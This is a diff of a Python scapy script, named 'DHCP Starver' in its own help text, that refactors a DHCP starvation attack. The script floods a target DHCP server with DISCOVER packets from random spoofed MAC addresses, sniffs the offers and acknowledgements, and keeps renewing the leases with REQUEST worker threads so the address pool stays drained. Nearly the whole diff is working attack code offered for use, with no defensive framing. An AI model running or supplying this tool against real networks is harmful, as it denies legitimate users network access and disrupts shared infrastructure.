@@ -4,7 +4,7 @@ from scapy.all import *
 import threading
 import time
 import ipaddress
-
+from queue import PriorityQueue
 
 # tested with python3
 
@@ -17,81 +17,40 @@ def randomMac():
     return firstByte + ":" + hexB() + ":" + hexB() + ":" + hexB() + ":" + hexB() + ":" + hexB()
 
 
-def getIPCount(ip_addr_start, ip_addr_end):
-    ip_range = ipaddress.summarize_address_range(ipaddress.IPv4Address(ip_addr_start),
-                                                 ipaddress.IPv4Address(ip_addr_end))
-    ip_count = 0
-    for subnet in ip_range:
-        ip_count += subnet.num_addresses
-    return ip_count
-
-
-def getIPList(ip_addr_start, ip_addr_end):
-    return [str(ip) for subnet in
-            ipaddress.summarize_address_range(ipaddress.IPv4Address(ip_addr_start), ipaddress.IPv4Address(ip_addr_end))
-            for ip in subnet]
-
-
-# returns true if ip2 > ip1
-def isIPHigher(ip1, ip2):
-    return ipaddress.IPv4Address(ip2) > ipaddress.IPv4Address(ip1)
-
-
 attack_macs = []
 
-
-class DhcpRequest(threading.Thread):
-    def __init__(self, ip_dict):
-        threading.Thread.__init__(self, name='requestSender', daemon=True)
-        self.ip_dict = ip_dict
-
-    def run(self):
-        while True:
-            for ip, metadata in self.ip_dict.items():
-                if not 'lease_expire' in metadata.keys() or metadata['lease_expire'] - time.time() < 5.0:
-                    if 'src_mac' in metadata.keys():
-                        src_mac = metadata['src_mac']
-                    else:
-                        src_mac = getUniqueMac()
-                        attack_macs.append(src_mac)
-                        metadata['src_mac'] = src_mac
-                    sendRequest(ip, src_mac)
-                    metadata['lease_expire'] = time.time() + 600
-                    self.ip_dict[ip] = metadata
-
-
-macAddresses = []
+usedMacAddresses = []
 
 
 def getUniqueMac():
     while True:
         macAddr = randomMac()
-        if macAddr not in macAddresses:
-            macAddresses.append(macAddr)
+        if macAddr not in usedMacAddresses:
+            usedMacAddresses.append(macAddr)
             return macAddr
-
-
-# to discover range of dhcp leasing addresses
-class DhcpDiscoverFlood(threading.Thread):
-    def __init__(self, target_server, stop_event, timeout=10, count=-1):
-        threading.Thread.__init__(self, name='discoverFlood', daemon=True)
-        self.target_server = target_server
-        self.stop_event = stop_event
-        self.timeout = timeout
-        self.count = count
-
-    def run(self):
-        time_started = time.time()
-        while not self.stop_event.isSet() and time.time() - time_started < self.timeout and self.count != 0:
-            mac_addr = getUniqueMac()
-            attack_macs.append(mac_addr)
-            sendDiscover(mac_addr, self.target_server)
-            self.count -= 1
-        print('finished discover flood')
 
 
 def getRandTransID():
     return random.randint(0, 0xFFFFFFFF)
+
+
+# to discover range of dhcp leasing addresses
+class DhcpDiscoverFlood(threading.Thread):
+    def __init__(self, target_server, stop_event, count=-1):
+        threading.Thread.__init__(self, name='discoverFlood', daemon=True)
+        self.target_server = target_server
+        self.stop_event = stop_event
+        self.remaining_count = count
+
+    def run(self):
+        sent_count = 1
+        while not self.stop_event.isSet() and self.remaining_count != 0:
+            mac_addr = getUniqueMac()
+            print('[*] sending discover pkt', sent_count)
+            sent_count += 1
+            sendDiscover(mac_addr, self.target_server)
+            self.remaining_count -= 1
+        print('[<] discover flood thread finished')
 
 
 def sendDiscover(macAddr, server_ip):
@@ -104,14 +63,44 @@ def sendDiscover(macAddr, server_ip):
     sendPkt(pkt)
 
 
+class DhcpRequestWorker(threading.Thread):
+    thread_id = 1
+
+    def __init__(self, ip_queue, stop_event):
+        self.thread_name = 'requestSender' + str(DhcpRequestWorker.thread_id)
+        threading.Thread.__init__(self, name=self.thread_name, daemon=True)
+        DhcpRequestWorker.thread_id += 1
+        self.ip_queue = ip_queue
+        self.stop_event = stop_event
+
+    def run(self):
+        while not self.stop_event.isSet():
+            # queue.get() blocks, item at 1st index of returned pair is priority number (when dhcp lease expires),
+            # lowest number is highest priority
+            lease_expire_time, elem = self.ip_queue.get()
+            if time.time() - lease_expire_time < 5.0:
+                lease_ip = elem['lease_ip']
+                if 'src_mac' in elem.keys():
+                    src_mac = elem['src_mac']
+                else:
+                    src_mac = getUniqueMac()
+                    attack_macs.append(src_mac)
+                print('[*] sending request for', lease_ip, 'with mac', src_mac)
+                sendRequest(lease_ip, src_mac)
+            else:
+                self.ip_queue.put((lease_expire_time, elem))
+            self.ip_queue.task_done()
+        print('[<] request thread', self.thread_name, 'finished')
+
+
 def sendRequest(request_addr, src_mac):
     transID = getRandTransID()
     pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac) / IP(dst="255.255.255.255", src="0.0.0.0") \
           / UDP(dport=67, sport=68) / BOOTP(op=1, xid=transID, chaddr=[mac2str(src_mac)]) \
           / DHCP(options=[('message-type', 'request'),
                           ('requested_addr', request_addr),
-                          ('hostname', 'jonDeRipper'),
-                          # ('server_id', self.server_ip),
+                          # ('hostname', 'jonDeRipper'),
+                          # ('server_id', server_ip),
                           'end'])
     sendPkt(pkt)
 
@@ -130,42 +119,42 @@ def getDhcpOption(pkt, op):
 
 
 def getDhcpMessageType(pkt):
-    options = pkt[DHCP].options
     return getDhcpOption(pkt, 'message-type')
 
 
 # populates ips list whenever dhcp response received from dhcp server with new lease IP address
 class DhcpSniffer(threading.Thread):
-    def __init__(self, iface, ip_dict, disc_stop_event, timeout=5):
+    def __init__(self, iface, ip_queue, stop_event):
         threading.Thread.__init__(self, name='dhcpSniffer', daemon=True)
         self.iface = iface
-        self.ip_dict = ip_dict
-        self.disc_stop_event = disc_stop_event
-        self.timeout = timeout
+        self.ip_queue = ip_queue
+        self.stop_event = stop_event
 
     def offerCallback(self, pkt):
         offered_ip = pkt[BOOTP].yiaddr
-        if offered_ip not in self.ip_dict.keys():
-            self.ip_dict[offered_ip] = {}
-        print('dhcp offer detected')
+        self.ip_queue.put( (time.time(), {'lease_ip': offered_ip}) )
+        print('[*] dhcp offer detected for', offered_ip)
 
     def ackCallback(self, pkt):
         acked_ip = pkt[BOOTP].yiaddr
         acked_client_mac = pkt[Ether].dst
         offer_time = getDhcpOption(pkt, 'lease_time')  # in seconds
+        lease_expire_time = time.time() + offer_time
         if acked_client_mac not in attack_macs:
-            print('detected client', acked_client_mac, 'with allocated IP', acked_ip)
+            print('[-] detected client', acked_client_mac, 'with allocated IP', acked_ip)
         else:
-            print('success! IP', acked_ip, 'successfully drained for next', offer_time, 'seconds')
-        self.ip_dict[acked_ip] = {'lease_expire': time.time() + offer_time, 'src_mac': acked_client_mac}
+            print('[+]', acked_ip, 'drained for next', offer_time, 'seconds')
+            self.ip_queue.put((lease_expire_time, {'lease_ip': acked_ip, 'src_mac': acked_client_mac}))
 
     def nackCallback(self, pkt):
-        # when nack received, stop sending discovery packets
-        self.disc_stop_event.set()
+        nacked_ip = pkt[BOOTP].yiaddr
+        nacked_client_mac = pkt[Ether].dst
+        print('[-] allocation failed for', nacked_ip, 'mac', nacked_client_mac)
 
     def dhcpPktCallback(self, pkt):
+        self.last_seen_dhcp = time.time()
         msg_type = getDhcpMessageType(pkt)
-        print('in dhcp pkt callback:', msg_type, pkt[BOOTP].show())
+        # print('in dhcp pkt callback:', msg_type, pkt[BOOTP].show())
         if msg_type == 2:  # offer
             self.offerCallback(pkt)
         elif msg_type == 5:  # ack
@@ -174,38 +163,58 @@ class DhcpSniffer(threading.Thread):
             self.nackCallback(pkt)
 
     def run(self):
-        sniff(iface=self.iface, store=0, prn=self.dhcpPktCallback,
-              filter='src port 67', lfilter=lambda pkt: pkt.haslayer(DHCP))  # , timeout=self.timeout)
-        print('finished dhcp sniff')
+        self.last_seen_dhcp = time.time()
+        while not self.stop_event.isSet():
+            sniff(iface=self.iface, prn=self.dhcpPktCallback,
+                  filter='src port 67', lfilter=lambda pkt: pkt.haslayer(DHCP), timeout=5)
+            if time.time() - self.last_seen_dhcp > 9:
+                print('[*] the wire is kinda quiet lately...')
+                self.last_seen_dhcp = time.time()
+        print('[<] dhcp sniffer thread finished')
 
 
 def main():
     desciption = "DHCP Starver"
     parser = ArgumentParser(description=desciption)
-    parser.add_argument('-t', '--target', required=True, help='specify DHCP server IP')
-    parser.add_argument('-i', '--iface', default='eth0', help='specify interface for DHCP starver to use')
-    parser.add_argument('-r', '--range', default=100, help='max range of IPs in DHCP allocation')
+    parser.add_argument('-t', '--target', required=True,
+                        help='specify DHCP server IP')
+    parser.add_argument('-i', '--iface', default='eth0',
+                        help='specify interface for DHCP starver to use')
+    parser.add_argument('-r', '--range', type=int, default=255,
+                        help='max number of IPs in DHCP allocation (educated guess)')
     parser.add_argument('-p', '--persist', action='store_true', default=False,
-                        help='if flag is specified, will persist DHCP starvation attack until %(prog)s is terminated')
+                        help='if flag is specified, will persist DHCP starvation attack until %(prog)s is terminated'
+                             '(False)')
+    parser.add_argument('-n', '--request-threads', default=3,
+                        help='number of threads for sending out DHCP request packets')
 
     parsed_args = parser.parse_args()
     iface = parsed_args.iface
     target = parsed_args.target
     persist = parsed_args.persist
-    ip_range = parsed_args.range
+    ip_leasing_count = parsed_args.range
+    num_of_req_threads = parsed_args.request_threads
 
-    ips_to_drain = {}
-    disc_stop_event = threading.Event()
+    ip_queue = PriorityQueue()
+    stop_event = threading.Event()
 
-    DhcpSniffer(iface, ips_to_drain, disc_stop_event, timeout=5).start()
-    DhcpDiscoverFlood(target, disc_stop_event, count=ip_range).start()
-    DhcpRequest(ips_to_drain).start()
+    DhcpSniffer(iface, ip_queue, stop_event).start()
 
+    DhcpDiscoverFlood(target, stop_event, ip_leasing_count).start()
+
+    if not persist:
+        time.sleep(10)
+        stop_event.set()
+
+    for i in range(num_of_req_threads):
+        DhcpRequestWorker(ip_queue, stop_event).start()
+
+    main_thread = threading.currentThread()
     for t in threading.enumerate():
-        try:
+        if t is not main_thread:
             t.join()
-        except:
-            pass
+
+    print('[<] main thread finished')
 
 
 if __name__ == '__main__':
